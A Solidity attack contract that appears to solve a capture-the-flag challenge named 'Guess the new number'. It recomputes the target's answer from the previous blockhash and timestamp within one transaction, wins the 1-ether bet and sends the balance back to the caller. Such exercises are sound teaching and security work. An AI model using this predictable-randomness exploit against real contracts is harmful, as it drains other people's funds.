// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

contract GuessTheNewNumberAttack {
    constructor(address payable challenge) public payable {
        // low-level call success
        bool success;

        // check that we're forwarding the correct amount of funds
        require(msg.value == 1 ether, 'msg.value should be at least 1 ether');

        // get answer
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        
        // make the guess
        (success,) = challenge.call{value:1 ether}(abi.encodeWithSignature("guess(uint8)", answer));
        require(success, "guess failed");

        // send funds back to my account
        (success,) = msg.sender.call{value:address(this).balance}("");
        require(success, 'call failed');
    }
}
